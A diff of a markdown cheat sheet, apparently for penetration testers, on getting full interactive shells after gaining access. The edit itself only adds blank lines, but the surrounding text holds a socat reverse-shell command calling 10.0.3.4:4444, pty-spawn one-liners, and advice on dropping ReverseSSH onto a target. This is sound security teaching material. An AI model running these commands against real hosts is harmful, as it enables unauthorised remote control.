@@ -9,11 +9,13 @@ toc:
 ---
 
 # Full TTYs
+
 ---
 
 Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Also, note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running `bash`.
 
 #### Python
+
 ---
 
 ```bash
@@ -26,6 +28,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 > You can get the **number** of **rows** and **columns** executing **`stty -a`**
 
 #### script
+
 ---
 
 ```bash
@@ -34,6 +37,7 @@ script /dev/null -qc /bin/bash #/dev/null is to not store anything
 ```
 
 #### socat
+
 ---
 
 ```bash
@@ -45,6 +49,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
 
 ### **Spawn shells**
+
 ---
 
 - `python -c 'import pty; pty.spawn("/bin/sh")'`
@@ -61,6 +66,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 - nmap: `!sh`
 
 ## ReverseSSH
+
 ---
 
 A convenient way for **interactive shell access**, as well as **file transfers** and **port forwarding**, is dropping the statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) onto the target.
@@ -105,6 +111,7 @@ sftp -P 8888 127.0.0.1
 ```
 
 ## Penelope
+
 ---
 
 [Penelope](https://github.com/brightio/penelope) automatically upgrades Linux reverse shells to TTY, handles the terminal size, logs everything and much more. Also it provides readline support for Windows shells.
@@ -112,6 +119,7 @@ sftp -P 8888 127.0.0.1
 ![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
 
 ## No TTY
+
 ---
 
 If for some reason you cannot obtain a full TTY you **still can interact with programs** that expect user input. In the following example, the password is passed to `sudo` to read a file:
